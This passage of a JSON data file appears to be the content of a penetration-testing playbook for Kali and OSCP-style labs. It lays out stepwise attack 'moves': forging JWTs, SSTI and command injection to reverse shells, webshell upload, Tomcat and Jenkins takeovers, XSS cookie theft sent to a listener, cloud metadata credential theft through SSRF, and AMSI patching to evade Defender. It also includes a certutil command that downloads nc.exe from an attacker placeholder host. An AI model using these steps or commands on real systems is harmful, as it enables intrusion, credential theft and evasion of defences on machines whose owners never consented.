      "win": "hashcat prints the signing secret.",
      "mistakes": [
        "Using the wrong mode; HMAC JWTs are mode 16500."
      ]
    },
    {
      "when": "Once you hold the secret, to mint any account.",
      "land": [
        "Craft a token with admin claims signed by the cracked or leaked secret, then send it."
      ],
      "win": "The forged token is accepted as an admin session.",
      "mistakes": [
        "A claim name mismatch; copy the exact claim names from the decoded token."
      ]
    },
    {
      "when": "The ten-second check on any JWT.",
      "look": [
        "Whether an alg:none token (no signature) is accepted, which bypasses verification entirely."
      ],
      "win": "The unsigned token is accepted.",
      "mistakes": [
        "Skipping this; it costs seconds and sometimes wins outright."
      ]
    }
  ],
  "ssti-to-rce": [
    {
      "when": "Right after template injection is confirmed, to identify the exact engine.",
      "look": [
        "49 for Jinja2 or Twig style, 7777777 for Twig concat, or an error that names the engine. That decides the gadget."
      ],
      "win": "The template engine is identified.",
      "mistakes": [
        "Reaching for an RCE gadget before you know the engine."
      ]
    },
    {
      "look": [
        "uid in the response, which is command execution through the engine gadget."
      ],
      "win": "The engine-specific gadget runs a command.",
      "mistakes": [
        "Using a gadget for the wrong engine."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "when": "To turn command execution into a shell.",
      "land": [
        "Swap the command for a reverse shell and catch it with your listener."
      ],
      "win": "Your listener receives a shell.",
      "mistakes": [
        "Firing the reverse shell before the listener is running."
      ]
    }
  ],
  "http-put-webshell": [
    {
      "when": "When the server allows PUT on a writable path (OPTIONS or verb tampering shows it).",
      "land": [
        "Write a server-side script into the web root. A 201 or 204 means it took; match the extension to the stack."
      ],
      "look": [
        "A 201 or 204 status, confirming the write."
      ],
      "win": "The script is written into the web root.",
      "mistakes": [
        "Writing the wrong extension for the server language."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "when": "To run commands, then upgrade to a shell.",
      "look": [
        "The command output (uid, or the Windows whoami) in the response."
      ],
      "win": "The uploaded script runs a command; swap in a reverse shell for a foothold.",
      "mistakes": [
        "Jumping to a reverse shell before the one-command check passes."
      ]
    },
    {
      "when": "When WebDAV is in play.",
      "look": [
        "Which extensions davtest reports as accepted AND executed."
      ],
      "win": "davtest names an extension that actually runs.",
      "mistakes": [
        "Guessing extensions when davtest will tell you which run."
      ]
    }
  ],
  "authz-abuse": [
    {
      "when": "Once you hold a forged token or a bypassed session.",
      "look": [
        "Every privileged action the admin surface exposes: user management, settings, uploads."
      ],
      "win": "The admin area opens with your forged token.",
      "mistakes": [
        "Grabbing one page and stopping; map the whole admin surface."
      ]
    },
    {
      "look": [
        "Password hashes and reused credentials in the user listing, which feed cracking and the spray list."
      ],
      "win": "The user and credential data dumps.",
      "mistakes": [
        "Ignoring hashes you could crack offline."
      ]
    },
    {
      "when": "The payoff, if an admin-only upload or config writer exists.",
      "land": [
        "Upload a webshell through the admin-only feature and request it."
      ],
      "look": [
        "uid in the response, which is a foothold."
      ],
      "win": "The admin upload runs code.",
      "mistakes": [
        "Overlooking a config or template writer, which is also code execution."
      ]
    }
  ],
  "nosql-injection": [
    {
      "when": "The moment a login talks to MongoDB or takes JSON where a string belongs, before any brute-force.",
      "look": [
        "A successful login from the $ne operator, matching any account."
      ],
      "win": "The operator logs you in with no real password.",
      "mistakes": [
        "Brute-forcing first; the operator bypass is faster and quieter."
      ]
    },
    {
      "when": "To extract a password character by character.",
      "look": [
        "Which character the $regex oracle confirms at each position."
      ],
      "win": "The password is recovered one character at a time.",
      "mistakes": [
        "Not scripting across the whole charset and every position."
      ]
    }
  ],
  "tomcat-deploy": [
    {
      "when": "When Tomcat Manager is reachable and you hold any valid credential (defaults, or a leaked tomcat-users.xml).",
      "land": [
        "Build the small deployable web application that carries a reverse shell."
      ],
      "win": "The deployable file is built.",
      "mistakes": [
        "Skipping the credential; the Manager needs a valid login to deploy."
      ]
    },
    {
      "land": [
        "Deploy it over the Manager text API with your credential; the chosen path then hosts the shell."
      ],
      "win": "The Manager reports the application deployed.",
      "mistakes": [
        "Wrong credential or path; confirm the login works first."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "land": [
        "Request the deployed path to fire the shell, and watch your listener."
      ],
      "win": "Your listener receives a shell as the Tomcat service account.",
      "mistakes": [
        "Not starting the listener before you trigger the app."
      ]
    }
  ],
  "jenkins-access": [
    {
      "use": [
        "shell-listener"
      ],
      "when": "When a Jenkins instance is reachable (port 8080).",
      "land": [
        "The Script Console runs Groovy as the Jenkins user; a reverse shell there is a foothold. Needs auth on hardened instances."
      ],
      "look": [
        "Command output in the console, which runs as the Jenkins user."
      ],
      "win": "The script console executes your command (or shell).",
      "mistakes": [
        "Assuming the console is open; hardened instances require a login."
      ]
    },
    {
      "when": "On affected versions, to read files unauthenticated.",
      "look": [
        "The leading lines of the file you requested, exposed by the CLI @file expansion."
      ],
      "win": "A protected file is read with no login.",
      "mistakes": [
        "Expecting the whole file; this exposes leading lines on affected versions."
      ]
    },
    {
      "look": [
        "The user list, and anonymous user disclosure from the api/json endpoint."
      ],
      "win": "Jenkins users are enumerated.",
      "mistakes": [
        "Overlooking the anonymous disclosure endpoints."
      ]
    }
  ],
  "wordpress": [
    {
      "setup": [
        {
          "label": "A free WPScan API token unlocks the vulnerability database",
          "cmd": "echo \"get a no-cost token at wpscan.com, then: export WPSCAN_API=<token>\""
        }
      ],
      "when": "On any WordPress site.",
      "look": [
        "Plugin and theme names with versions, which you match to known issues, and the user list for a password attack."
      ],
      "win": "Plugins, themes, users, and versions enumerate.",
      "mistakes": [
        "Skipping the API token, which leaves the vulnerability matching blind."
      ]
    },
    {
      "when": "When the passive pass turns up nothing.",
      "look": [
        "Plugins the aggressive detection finds that the passive scan missed."
      ],
      "win": "Aggressive detection surfaces more plugins.",
      "mistakes": [
        "Being loud on a quiet engagement; aggressive detection is noisier."
      ]
    },
    {
      "look": [
        "A method list from xmlrpc, which means wp.getUsersBlogs can test passwords in bulk."
      ],
      "win": "xmlrpc answers with its methods.",
      "mistakes": [
        "Ignoring xmlrpc; it is a quiet bulk password-testing channel."
      ]
    },
    {
      "when": "On older WordPress instances (<= 5.2.3) to check for unauthenticated draft/private post disclosure (CVE-2019-17671).",
      "land": [
        "Appending ?static=1 bypasses the query filter on vulnerable versions and dumps unpublished draft posts."
      ],
      "look": [
        "Draft post bodies containing internal URLs, password reset notes, or admin credentials."
      ],
      "win": "Unpublished WordPress draft posts print without authentication.",
      "mistakes": []
    }
  ],
  "nikto-scan": [
    {
      "when": "Early, in the background, while you work other things by hand.",
      "look": [
        "Known-bad files, stale server versions, and default apps that targeted discovery can miss."
      ],
      "win": "nikto reports server issues and interesting files.",
      "mistakes": [
        "Waiting on it; push it to the background and keep working."
      ]
    },
    {
      "when": "For HTTPS targets.",
      "look": [
        "The same findings over TLS; use -p for multi-port scans."
      ],
      "win": "The SSL scan completes.",
      "mistakes": [
        "Forgetting -ssl, so the HTTPS scan fails to connect."
      ]
    },
    {
      "when": "To cut the noise.",
      "look": [
        "File, misconfiguration, and software findings, with the noise-only checks tuned out."
      ],
      "win": "A focused report prints without the reverse-lookup clutter.",
      "mistakes": [
        "Reading the full noisy output when tuning would have focused it."
      ]
    }
  ],
  "command-injection": [
    {
      "when": "On any feature that plausibly shells out (a ping box, a DNS lookup, a converter).",
      "look": [
        "The command output appended to the response, OR a change in response timing. Either confirms execution."
      ],
      "win": "A command runs and its output (or a delay) comes back.",
      "mistakes": [
        "Trying only one separator; rotate through the list in the note."
      ]
    },
    {
      "when": "When there is no visible output (blind injection).",
      "look": [
        "A multi-second delay from the sleep, which proves blind execution."
      ],
      "win": "The response lags by the sleep duration.",
      "mistakes": [
        "Concluding no injection from empty output; test timing."
      ]
    },
    {
      "when": "When spaces or keywords are filtered.",
      "land": [
        "The Workbench Encoder turns a command into the ${IFS} space-evasion form and URL-encodes it in one place, so a space or character filter stops blocking it."
      ],
      "look": [
        "The file read succeeding despite the filter (the note lists the evasions: ${IFS}, brace expansion, quoting)."
      ],
      "win": "The evasion gets the command through.",
      "mistakes": [
        "Giving up at the first filter; several evasions usually exist."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "when": "After execution is confirmed, to get a shell.",
      "land": [
        "Build the reverse shell in the Workbench (base64-wrap it if the field mangles characters), run it through the injection, and catch it on your listener."
      ],
      "win": "Your listener receives a shell.",
      "mistakes": [
        "Not URL-encoding the special characters, so the payload breaks (the Workbench Encoder does this for you)."
      ]
    }
  ],
  "idor": [
    {
      "when": "Any time an object is fetched by an id you can see (a profile, invoice, file, message).",
      "land": [
        "Use two accounts: capture a request that returns YOUR object, then replay it with the id changed and compare."
      ],
      "look": [
        "Another user object coming back for a changed id. Check cookies and JSON bodies too."
      ],
      "win": "A changed id returns data that is not yours.",
      "mistakes": [
        "Checking only URL parameters; references hide in cookies and bodies."
      ]
    },
    {
      "when": "When the reference is encoded (base64, a hash, a uuid).",
      "land": [
        "Decode it, work out the scheme, then re-encode the adjacent value."
      ],
      "look": [
        "A decodable reference whose neighbour returns another record."
      ],
      "win": "The encoded reference is understood and an adjacent one works.",
      "mistakes": [
        "Assuming an encoded id is safe; decode it first."
      ]
    },
    {
      "when": "To confirm the class at scale.",
      "look": [
        "Any 200 across the id range that returns another user data."
      ],
      "win": "Bulk fuzzing confirms many vulnerable records.",
      "mistakes": [
        "Not filtering the not-yours response size, so hits are buried."
      ]
    },
    {
      "look": [
        "Admin or hidden endpoints in the client AJAX calls that the UI never shows your role."
      ],
      "win": "The JavaScript reveals endpoints holding object references.",
      "mistakes": [
        "Deciding nothing is left before reading the client JS."
      ]
    }
  ],
  "web-login-brute": [
    {
      "setup": [
        {
          "label": "Unpack rockyou if you need a password list",
          "cmd": "gunzip -k /usr/share/wordlists/rockyou.txt.gz"
        }
      ],
      "when": "Once you have an enumerated user list.",
      "look": [
        "A hydra hit line naming a login and password.",
        "The fail string must be text that appears ONLY on a failed login."
      ],
      "win": "hydra prints a valid login and password.",
      "mistakes": [
        "A wrong fail string, which makes every attempt look like a success or failure."
      ]
    },
    {
      "when": "For WordPress, reusing the enumerated users.",
      "look": [
        "A valid WordPress login from the enumerated users."
      ],
      "win": "wpscan finds a working wp-login credential.",
      "mistakes": [
        "Not feeding back the users wpscan already enumerated."
      ]
    },
    {
      "when": "Always, alongside the web brute.",
      "look": [
        "An SSH hit, which is a direct foothold (web and shell passwords are reused constantly)."
      ],
      "win": "hydra finds an SSH login among the app users.",
      "mistakes": [
        "Only brute-forcing the web form; try the same users on SSH."
      ]
    }
  ],
  "idor-harvest": [
    {
      "when": "Once an IDOR is confirmed, to pull every record.",
      "look": [
        "Each 200 as another user record; filter out the not-yours response size."
      ],
      "win": "The whole object range returns records.",
      "mistakes": [
        "Not filtering by size, so the real hits are hard to see."
      ]
    },
    {
      "look": [
        "password, token, api_key, or secret in the harvested records, which feed cracking and the spray list."
      ],
      "win": "Credentials fall out of the export or profile endpoint.",
      "mistakes": [
        "Pulling records but not grepping them for secrets."
      ]
    }
  ],
  "verb-tampering": [
    {
      "when": "On a path that returned 401 or 403 to a normal request.",
      "look": [
        "The Allow header, which discloses exactly which methods the server will take."
      ],
      "win": "The server names the methods it allows.",
      "mistakes": [
        "Not reading the Allow header before trying verbs blindly."
      ]
    },
    {
      "look": [
        "A 200 from a verb (HEAD, PUT, OPTIONS) where GET returned 401 or 403. That is an auth bypass."
      ],
      "win": "A different verb walks past the access check.",
      "mistakes": [
        "Testing only GET and POST, the two the rules usually cover."
      ]
    },
    {
      "when": "When PUT is honoured on a writable path.",
      "look": [
        "A webshell written in directly, which you then request to confirm execution."
      ],
      "win": "The PUT lands a webshell on the server.",
      "mistakes": [
        "Assuming PUT is blocked without testing it."
      ]
    }
  ],
  "web-shells": [
    {
      "when": "Once you can write a file into the web root (upload, LFI-to-log, SQL OUTFILE, or PUT).",
      "look": [
        "A shell file matching the server language: php for PHP, aspx for IIS, jsp or a WAR for Tomcat."
      ],
      "win": "The right shell for the stack is selected from the Kali collection.",
      "mistakes": [
        "Uploading a PHP shell to an IIS site; match the language."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "land": [
        "Set your IP and port in the reverse-shell file, upload it, and catch it on your listener. A quieter option is the command-only shell."
      ],
      "win": "Your listener receives a shell when the file is requested.",
      "mistakes": [
        "Forgetting to set your IP and port in the shell file."
      ]
    },
    {
      "land": [
        "A one-liner command shell for when the collections are not around."
      ],
      "win": "A minimal webshell is written.",
      "mistakes": [
        "Using the wrong language one-liner for the server."
      ]
    },
    {
      "when": "Before upgrading to a reverse shell.",
      "look": [
        "The command output (uid), which proves the webshell runs. If it does not run, it is a path problem, not a payload problem."
      ],
      "win": "The webshell returns a command result.",
      "mistakes": [
        "Blaming the payload when the real issue is the path you requested."
      ]
    }
  ],
  "xss-basics": [
    {
      "when": "On any input reflected into a page, and especially a stored field a privileged user will view.",
      "look": [
        "Your unique probe string reflected unescaped in the response."
      ],
      "win": "The probe reflects, confirming the input is rendered.",
      "mistakes": [
        "Jumping to alert(1) before confirming plain reflection."
      ]
    },
    {
      "when": "To receive what the victim browser sends.",
      "look": [
        "Any request landing on your simple HTTP listener, which proves a browser ran your script."
      ],
      "win": "Your listener is up and ready for the callback.",
      "mistakes": [
        "Not having the listener running before planting the payload."
      ]
    },
    {
      "when": "To steal a session.",
      "look": [
        "The victim cookie arriving on your listener, which you then reuse in your own browser."
      ],
      "win": "The admin cookie reaches your listener.",
      "mistakes": [
        "Planting a reflected-only payload where a stored one was needed."
      ]
    },
    {
      "when": "To read a page you cannot reach yourself.",
      "look": [
        "The admin-only page contents exfiltrated (base64) to your listener."
      ],
      "win": "The admin page content arrives at your listener.",
      "mistakes": [
        "Forgetting the content is base64-encoded in transit."
      ]
    }
  ],
  "ajp-ghostcat": [
    {
      "when": "When port 8009 (AJP) is open and reachable directly.",
      "look": [
        "An AJP13 connector confirmed by the version scan."
      ],
      "win": "The AJP port is confirmed reachable.",
      "mistakes": [
        "Pointing a browser at 8009 and concluding nothing is there; it is not HTTP."
      ]
    },
    {
      "look": [
        "WEB-INF/web.xml contents, which map the app and often name config files with secrets."
      ],
      "win": "A protected file under the web root is read.",
      "mistakes": [
        "Reading only web.xml; follow it to the config files it names."
      ]
    },
    {
      "when": "Only if the app let you upload a file.",
      "look": [
        "The uploaded file executed as JSP, which is code execution."
      ],
      "win": "The uploaded file runs as code via the eval mode.",
      "mistakes": [
        "Trying eval mode with no uploaded file to include."
      ]
    }
  ],
  "java-rmi": [
    {
      "when": "When port 1099 (RMI) is open, usually an internal management interface.",
      "look": [
        "The bound object names in the registry, which are your targets."
      ],
      "win": "The registry objects list.",
      "mistakes": [
        "Ignoring 1099 as obscure; it is often a deserialization door."
      ]
    },
    {
      "look": [
        "Known weaknesses remote-method-guesser reports (registry deser, codebase, activator)."
      ],
      "win": "rmg names the exploitable weakness.",
      "mistakes": [
        "Skipping the enum pass and guessing the attack."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "land": [
        "Fire a gadget at a bound name that deserializes, with a reverse shell, matched to the classpath rmg reports."
      ],
      "win": "Your listener receives a shell.",
      "mistakes": [
        "Using a gadget that does not match the reported classpath."
      ]
    }
  ],
  "lfi-secret-harvest": [
    {
      "when": "Once a file include is confirmed, to turn it into credentials.",
      "look": [
        "The account list in /etc/passwd, naming users worth a password or key."
      ],
      "win": "The user accounts are enumerated.",
      "mistakes": [
        "Treating the LFI as the finish; it is a read primitive to mine."
      ]
    },
    {
      "look": [
        "Config source (base64-decoded) carrying database or app secrets."
      ],
      "win": "Config secrets come back through the filter wrapper.",
      "mistakes": [
        "Reading config as raw PHP, which executes or mangles it."
      ]
    },
    {
      "look": [
        "A readable SSH private key, which is a direct login (crack a passphrase with ssh2john if needed)."
      ],
      "win": "A private key is read and usable.",
      "mistakes": [
        "Overlooking home directories; id_rsa is a direct way in."
      ]
    }
  ],
  "aws-credential-abuse": [
    {
      "when": "Once an SSRF has yielded temporary AWS keys from the metadata service.",
      "land": [
        "Load the access key, secret, and session token. The session token is mandatory for temporary (ASIA) keys."
      ],
      "win": "The keys are loaded into your environment.",
      "mistakes": [
        "Omitting the session token, so the temporary keys are rejected."
      ]
    },
    {
      "look": [
        "The role or user the keys map to, from get-caller-identity."
      ],
      "win": "The identity and role are confirmed valid.",
      "mistakes": [
        "Acting before confirming the keys work and who they are."
      ]
    },
    {
      "look": [
        "Readable S3 buckets and Secrets Manager entries the role can reach."
      ],
      "win": "The role permissions are mapped.",
      "mistakes": [
        "Not probing beyond S3; secrets often hold the real prize."
      ]
    },
    {
      "when": "Where ssm:SendCommand is allowed.",
      "look": [
        "Command output from the instance, run as root or SYSTEM."
      ],
      "win": "You run commands on the instance through SSM.",
      "mistakes": [
        "Assuming SSM is allowed; the role may not permit it."
      ]
    }
  ],
  "graphql-abuse": [
    {
      "when": "On any /graphql endpoint.",
      "look": [
        "The full schema from introspection: every type, query, and mutation. If it is off, diff the client JS."
      ],
      "win": "Introspection returns the whole schema.",
      "mistakes": [
        "Giving up when introspection is off; the client JS names fields too."
      ]
    },
    {
      "look": [
        "Another user data (users, email, role) returned unauthenticated, which is a direct finding."
      ],
      "win": "A query returns data you should not see.",
      "mistakes": [
        "Querying only your own data; test for broken authorization."
      ]
    },
    {
      "look": [
        "A privileged mutation succeeding as a low-privilege or anonymous user."
      ],
      "win": "A mutation you should not run is accepted.",
      "mistakes": [
        "Testing only read queries; mutations are where escalation lives."
      ]
    }
  ],
  "azure-imds": [
    {
      "when": "When an SSRF reaches 169.254.169.254 on an Azure VM.",
      "look": [
        "Instance metadata that confirms an Azure VM and names the resource group."
      ],
      "win": "The Azure metadata responds through the SSRF.",
      "mistakes": [
        "Forgetting the Metadata:true header, which the endpoint requires."
      ]
    },
    {
      "look": [
        "An access token scoped to ARM (a separate token is needed per resource, such as Key Vault)."
      ],
      "win": "A managed-identity token comes back.",
      "mistakes": [
        "Requesting one token and expecting it to work for every resource."
      ]
    },
    {
      "look": [
        "The subscriptions, resource groups, VMs, and Key Vaults the identity can see."
      ],
      "win": "The token lists what the identity can reach.",
      "mistakes": [
        "Not enumerating broadly; the identity may reach more than expected."
      ]
    },
    {
      "when": "With a Contributor or VM-admin role.",
      "look": [
        "Command output from a VM, run as root or SYSTEM via run-command."
      ],
      "win": "You run commands on a VM through the token.",
      "mistakes": [
        "Assuming the role allows run-command; check what it can do first."
      ]
    }
  ],
  "gcp-metadata": [
    {
      "when": "When an SSRF reaches 169.254.169.254 on a GCP VM.",
      "look": [
        "Instance metadata that confirms a GCP VM and names the project."
      ],
      "win": "The GCP metadata responds through the SSRF.",
      "mistakes": [
        "Forgetting the Metadata-Flavor: Google header, which is required."
      ]
    },
    {
      "look": [
        "An OAuth token starting ya29., and a broad cloud-platform scope in the scopes path."
      ],
      "win": "A service-account token comes back.",
      "mistakes": [
        "Not checking the token scope, which decides what it can reach."
      ]
    },
    {
      "look": [
        "The projects, buckets, secrets, and service accounts the identity can reach."
      ],
      "win": "The token enumerates accessible resources.",
      "mistakes": [
        "Stopping at project listing; secrets hold the real value."
      ]
    },
    {
      "look": [
        "Secret Manager values (base64), which decode into credentials for the loop."
      ],
      "win": "A secret is read and decoded.",
      "mistakes": [
        "Forgetting to base64-decode the secret value."
      ]
    }
  ],
  "http-request-smuggling": [
    {
      "when": "When a front-end proxy sits in front of the origin.",
      "look": [
        "A Via or cache header, which means a front-end is present: the precondition for a desync."
      ],
      "win": "A front-end proxy is confirmed.",
      "mistakes": [
        "Testing for smuggling with no front-end, where it cannot happen."
      ]
    },
    {
      "look": [
        "A long, consistent delay on the CL.TE probe versus an instant control, which confirms the desync."
      ],
      "win": "The timing difference confirms the disagreement.",
      "mistakes": [
        "Reading one timing without a control to compare against."
      ]
    },
    {
      "look": [
        "Your smuggled prefix appearing on the next victim request as you develop it iteratively."
      ],
      "win": "A smuggled request queues onto the next response.",
      "mistakes": [
        "Expecting it to work first try; smuggling is developed step by step."
      ]
    }
  ],
  "prototype-pollution": [
    {
      "when": "When an app merges JSON you control into an object (a settings or profile update).",
      "look": [
        "Your injected property (polluted) appearing on an object that never had it, which proves the merge pollutes the prototype."
      ],
      "win": "The injected property shows up where it should not.",
      "mistakes": [
        "Testing only __proto__; constructor.prototype is the fallback."
      ]
    },
    {
      "look": [
        "A privileged route honouring a property you polluted (isAdmin)."
      ],
      "win": "The polluted property changes the app behaviour.",
      "mistakes": [
        "Polluting a property the app does not actually read."
      ]
    },
    {
      "look": [
        "The polluted property honoured on the admin route, or a gadget that turns it into RCE."
      ],
      "win": "The pollution is confirmed to change authorization.",
      "mistakes": [
        "Expecting RCE directly; it usually flips an authorization check first."
      ]
    }
  ],
  "mass-assignment": [
    {
      "when": "On an API that maps request fields onto a model (a profile or user update).",
      "look": [
        "Fields the API returns that the form hides (role, isAdmin, verified). Those are candidates to write."
      ],
      "win": "The response reveals writable fields the UI never shows.",
      "mistakes": [
        "Only sending the fields the form shows."
      ]
    },
    {
      "look": [
        "The privileged field echoing back after your update, which means the write stuck."
      ],
      "win": "An update sets a field the UI never offers.",
      "mistakes": [
        "Not confirming the field persisted after the update."
      ]
    },
    {
      "when": "When update is guarded but registration is not.",
      "look": [
        "A fresh account created with role admin, cleaner than escalating a watched one."
      ],
      "win": "The create endpoint accepts the privileged field.",
      "mistakes": [
        "Escalating an existing account when a new admin is quieter."
      ]
    }
  ],
  "shell-listener": [
    {
      "when": "Always first. Start the listener BEFORE you fire any reverse shell, or the callback hits a closed port and is lost.",
      "land": [
        "Run this on Kali and leave it open. rlwrap gives you arrow keys and command history in the caught shell.",
        "Match the port to the one in your payload. The Workbench reverse-shell builder shows both sides at once."
      ],
      "look": [
        "\"listening on [any] 4444\", then when the shell lands, a \"connect to ... from <target>\" line."
      ],
      "win": "A connection line appears and a shell prompt opens in this terminal.",
      "mistakes": [
        "Firing the payload before the listener is up.",
        "Listener port not matching the payload port."
      ]
    },
    {
      "when": "When you want a listener that survives a dropped shell and upgrades the PTY for you.",
      "land": [
        "penelope catches the shell, upgrades it to a PTY automatically, and logs the session."
      ],
      "look": [
        "penelope prints the caught connection and drops you into an upgraded prompt."
      ],
      "win": "penelope reports the connection and hands you an interactive, logged shell.",
      "mistakes": [
        "Assuming it is installed. It is a pip tool, so stage it first if your box lacks it."
      ]
    }
  ],
  "egress-blocked-shell": [
    {
      "when": "Your payload ran but nothing reached your listener, or a test connection is refused or times out.",
      "land": [
        "Move the listener to 443, then 53. Outbound web and DNS almost always leave even a filtered network.",
        "Rebuild the payload on that port in the Workbench so both sides agree."
      ],
      "look": [
        "The callback now lands on 443 where 4444 was silent."
      ],
      "win": "The shell connects back once you switch to a port egress allows.",
      "mistakes": [
        "Giving up and calling the box unexploitable. It is almost always a port choice."
      ]
    },
    {
      "when": "When the target cannot dial OUT but you can reach a port IN.",
      "land": [
        "Flip the direction: have the TARGET listen with a bind shell, then connect to it from Kali."
      ],
      "look": [
        "Your nc to the target port lands you in a shell."
      ],
      "win": "You connect inbound to the target and get a prompt.",
      "mistakes": [
        "Forgetting the target firewall may also block the inbound port."
      ]
    },
    {
      "when": "When you already hold any foothold on the network.",
      "land": [
        "Check that box own egress and listeners so you pick a port that actually works instead of guessing."
      ],
      "look": [
        "ss and iptables show which ports leave and what is already listening."
      ],
      "win": "You see exactly which ports leave, and aim the payload there.",
      "mistakes": [
        "Guessing ports blind when a foothold could tell you for sure."
      ]
    }
  ],
  "certutil-usage-doctor": [
    {
      "when": "Certutil answered with 'Too many arguments' or 'Expected no more than N args', so nothing was fetched.",
      "land": [
        "Put the URL first and the output path last, and keep the -f: certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe."
      ],
      "look": [
        "The download runs and the file lands in the temp path you gave."
      ],
      "win": "The file transfers once the arguments are in the right order.",
      "mistakes": [
        "Flipping the URL and output path, or dropping -f. Certutil counts the extra token as a stray argument."
      ]
    },
    {
      "when": "When a raw download is blocked or the file is binary-unsafe over the channel you have.",
      "land": [
        "Base64-encode on the source: certutil -encode loot.zip loot.b64, then move the text across."
      ],
      "look": [
        "A .b64 text file appears next to the source file."
      ],
      "win": "The file becomes text you can paste or transfer through a limited channel.",
      "mistakes": [
        "Adding flags or a third argument. The -encode form takes exactly input then output."
      ]
    },
    {
      "when": "On the target, once the base64 text has arrived.",
      "land": [
        "Decode it back: certutil -decode loot.b64 loot.zip."
      ],
      "look": [
        "The original bytes are reconstructed at the output path."
      ],
      "win": "The transferred text becomes the working file again.",
      "mistakes": [
        "Swapping the argument order. It is input then output, same as -encode."
      ]
    }
  ],
  "shell-revshell-linux": [
    {
      "when": "The moment you have command execution on a Linux target and a listener waiting.",
      "land": [
        "Start the listener first (the shell-listener move). Build the exact one-liner for your LHOST and port in the Workbench Reverse Shell tab, and base64-wrap it if the target field mangles characters.",
        "Fire it through your execution primitive (a web shell, an injection, a cron job)."
      ],
      "look": [
        "Your listener prints a connection from the target IP."
      ],
      "win": "A shell prompt from the target appears in your listener.",
      "mistakes": [
        "No listener running when the payload fires.",
        "Using bash syntax where only sh exists. Try the mkfifo or python form instead."
      ]
    },
    {
      "when": "When bash /dev/tcp is unavailable or unreliable on the box.",
      "land": [
        "The python3 form is very reliable and can hand you a PTY straight away. Build it in the Workbench."
      ],
      "look": [
        "The callback lands and, with pty.spawn, you get a usable terminal immediately."
      ],
      "win": "A python-spawned shell connects back.",
      "mistakes": [
        "Assuming python3 exists. Try python or python2 if it is absent."
      ]
    }
  ],
  "shell-revshell-windows": [
    {
      "when": "When you have command execution on Windows and a listener up.",
      "land": [
        "Build the PowerShell payload in the Workbench and use the Base64 (-EncodedCommand) toggle. That is how OffSec teaches it for the OSCP, and it dodges quoting and bad-character breakage.",
        "Fire it through your execution primitive."
      ],
      "look": [
        "Your listener catches a PowerShell session from the target."
      ],
      "win": "A PowerShell prompt from the target appears in your listener.",
      "mistakes": [
        "Pasting an un-encoded one-liner into a field that mangles quotes.",
        "Defender eating it. See the AMSI move if the payload is flagged."
      ]
    }
  ],
  "shell-pty-upgrade": [
    {
      "when": "Right after you catch a raw reverse shell that drops Ctrl-C, arrow keys, and tab-complete.",
      "land": [
        "Follow the ordered steps the canvas shows. The key part is Ctrl-Z back to Kali, then stty raw -echo, then fg.",
        "Finish with export TERM=xterm so less and vim behave."
      ],
      "look": [
        "After the upgrade, su, sudo and vim stop erroring and arrow keys work."
      ],
      "win": "Ctrl-C no longer kills your shell and vim and sudo run cleanly.",
      "mistakes": [
        "Forgetting to run stty raw -echo on Kali before fg.",
        "Not setting TERM, so less and vim misbehave."
      ]
    }
  ],
  "fix-no-tty": [
    {
      "when": "You hit \"sudo: no tty present\" or \"must be run from a terminal\".",
      "land": [
        "Spawn a PTY with python (python2 works too). No python? Use script -qc /bin/bash /dev/null."
      ],
      "look": [
        "sudo, su and ssh stop refusing once you have a controlling terminal."
      ],
      "win": "sudo prompts for a password instead of erroring about a tty.",
      "mistakes": [
        "Trying to run sudo from a raw pipe before upgrading."
      ]
    },
    {
      "land": [
        "Finish the upgrade: Ctrl-Z, on Kali run stty raw -echo then fg, then export TERM=xterm and set rows and cols."
      ],
      "look": [
        "Arrow keys, tab-complete, and a correctly sized screen."
      ],
      "win": "A full interactive terminal with history and editing.",
      "mistakes": [
        "Skipping the stty step, which leaves echo doubled or broken."
      ]
    }
  ],
  "fix-tool-wont-run": [
    {
      "when": "\"bad interpreter: No such file or directory\" on a script you uploaded.",
      "land": [
        "Strip Windows CRLF line endings with dos2unix (or sed). The kernel was looking for an interpreter literally named /bin/bash followed by a carriage return."
      ],
      "look": [
        "The script runs instead of erroring on the shebang."
      ],
      "win": "The script executes normally after the CRLF strip.",
      "mistakes": [
        "Re-uploading from the same Windows editor and re-introducing CRLF."
      ]
    },
    {
      "when": "A binary gives \"Permission denied\" even after chmod +x.",
      "land": [
        "/tmp is probably mounted noexec. Run it from /dev/shm or another exec-allowed path instead."
      ],
      "look": [
        "The binary runs from /dev/shm where it would not from /tmp."
      ],
      "win": "The tool executes once moved off the noexec mount.",
      "mistakes": [
        "Assuming the binary is broken when the mount is the real block."
      ]
    }
  ],
  "bypass-amsi": [
    {
      "when": "\"This script contains malicious content\" or \"contains a virus\": AMSI or Defender flagged a known signature, not a broken technique.",
      "land": [
        "Patch AMSI in your CURRENT PowerShell session (the canvas shows the string-split one-liner), then re-run your payload."
      ],
      "look": [
        "The script that was blocked now loads without the AMSI error."
      ],
      "win": "Your payload runs after the in-memory patch.",
      "mistakes": [
        "Thinking the technique is broken. It is only the signature, the payload is fine."
      ]
    },
    {
      "when": "When the patch itself is caught.",
      "land": [
        "Obfuscate (rename variables, base64 and IEX), use a fresh or rewritten tool, or drop to a living-off-the-land path that is not signatured."
      ],
      "look": [
        "A reworded or LOLBAS approach slips past where the known tool did not."
      ],
      "win": "The action completes via an unsignatured path.",
      "mistakes": [
        "Reusing the exact public tool that is already flagged."
      ]
    }
  ],
  "ssh-key-login": [
    {
      "when": "You recovered a PEM private key from loot (an LFI, a backup, a readable home, a git dump) and SSH is reachable.",
      "land": [
        "Save the key to id_rsa, chmod 600 it, then log in. Work out the username from the key path or comment, an enumerated user, or the box theme."
      ],
      "look": [
        "A shell prompt as the key owner."
      ],
      "win": "You land a shell over SSH with the recovered key.",
      "mistakes": [
        "A world-readable key, which SSH ignores. chmod 600 it.",
        "An encrypted key (ENCRYPTED in the header) needs its passphrase. Crack it with ssh2john, or find it in loot. The ssh-key-troubleshoot move walks every rejection."
      ]
    }
  ],
  "ssh-key-troubleshoot": [
    {
      "when": "\"UNPROTECTED PRIVATE KEY FILE\" or \"permissions are too open\".",
      "land": [
        "chmod 600 the key. This is client-side, on YOUR Kali, not the target."
      ],
      "look": [
        "SSH stops refusing the key for permissions."
      ],
      "win": "The permissions warning is gone.",
      "mistakes": [
